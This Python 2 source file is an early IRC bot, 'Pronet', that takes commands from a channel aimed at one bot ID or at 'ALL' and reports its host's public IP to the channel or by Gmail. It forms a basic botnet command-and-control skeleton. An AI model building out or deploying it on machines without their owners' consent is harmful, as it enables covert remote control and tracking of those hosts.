#
#	Pronet - Python Bot V2
#	Josh Bosley
#	OCTOBER 2013		     
#
#       The bot awaits input from the channel. If the input begins with the commandID,
#       the input from the channel is spliced, where the bot will identify if the command
#       is for it, or another bot. The splice also harbors the command.
#
#       Example:  Tell bot 10 to email the public ip of host            = ^&*_10_EMAILIP 
#                       Or: Tell all bots to email ip of their host     = ^&*_ALL_EMAILIP 
#

import os
import random
import urllib2
import smtplib
import socket

class pronet(object):
                
	def __init__(self, name):
		
		# Show self.data in __getData__()
		self.display = (1)

		# Connection / Information Variables 
		self.host      = ('127.0.0.1') # irc.arcti.ca
		self.channel   = ('#derpistan')
		self.ipRead    = ('http://ip.42.pl/raw')
		self.port      = (6667)
		self.emailAddress  = ('USER@gmail.com')
		self.emailPassword = ('PASSWD')
		self.commandID = ('^&*')
		self.cmdID = ('00')
		self.shouldReply = True
		self.name = name
		self.listen = True

		# Bot information
		self.randomNum = str(random.randint(2, 2000))
		self.nick      = (self.name + '_' + self.randomNum)
		self.identity  = ('net_' + self.randomNum)
		self.realName  = ('_Arbiter_' + self.nick)
		self.publicIp  = urllib2.urlopen(self.ipRead).read()

                # Initialize Socket
		self.__initSocket__();

		# Recieve data, and pass to handler 
		while (self.listen):
                        
			self.__getData__();
			self.__handleData__();
		
		# Shutdown bot
		if not self.listen: exit();

		return;

	def __initSocket__(self):
                
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.connect((self.host, self.port))
		self.s.send('NICK %s \r\n' % self.nick)
		self.s.send('USER %s %s bla :%s \r\n' %
			 (self.identity, self.host, self.realName))
		self.s.send('JOIN %s \r\n' % self.channel)
		
		return;
	
	def __getData__(self):
                
		self.shouldReply = False
		self.data = self.s.recv( 4096 )
		
		if self.commandID in self.data:
                        
			splice = self.data.split('_')
			self.cmdID  = splice[1]
			self.data   = splice[2].strip()
			del splice

		if (self.cmdID == self.randomNum) or (self.cmdID == 'ALL'): self.shouldReply = True

		if (self.display): print self.data

		return;

	def __handleData__(self):
		
		self.dataOptions = ['PING','QUIT','EMAILIP','HELP','INFO']
		
		if (self.data[0:4] == self.dataOptions[0]):
			self.s.send(' \r\n')
			self.s.send('PONG ' + self.data.split() [1] + '\r\n')

		if (self.data == self.dataOptions[1]) and self.shouldReply:
			self.listen = False
			self.s.close

		if (self.data == self.dataOptions[2]) and self.shouldReply:
			self.__emailBotData__();

		if (self.data == self.dataOptions[3]) and self.shouldReply:
			out = ('')
			for i in range(len(self.dataOptions)-1):
				out = (out + str(self.dataOptions[i+1]) + ', ')
			del i
			self.s.send('PRIVMSG '+self.channel+' : ' + out + '\r\n')
			del out

		if (self.data == self.dataOptions[4]) and self.shouldReply:
			self.s.send('PRIVMSG '+self.channel+' : ' + ' - - - - - - - - - - - - - - -  ' + '\r\n')
			self.s.send('PRIVMSG '+self.channel+' : ' + ' | Bot: ' + self.randomNum + '\r\n')
			self.s.send('PRIVMSG '+self.channel+' : ' + ' | Host: ' + self.publicIp + '\r\n')
			self.s.send('PRIVMSG '+self.channel+' : ' + ' - - - - - - - - - - - - - - -  ' + '\r\n')
	
		return;
	
	def __emailBotData__(self):
		
		c = smtplib.SMTP('smtp.gmail.com',587)
		c.ehlo()
		c.starttls()
		c.ehlo()
		c.login(self.emailAddress, self.emailPassword)
		header = ('To:'+self.emailAddress+'\n'+'From:'+self.nick+'\n'+'Sub:Report \n')
		msg = (header+'\n IP:'+self.publicIp+'\n\n')
		c.sendmail(self.emailAddress,self.emailAddress,msg)
		c.close()
		del header
		del msg

		return;



# Start the IRC bot

def main():

	initializeProNet = pronet('proNet')	

	return;

if (__name__ == '__main__'):
	main();
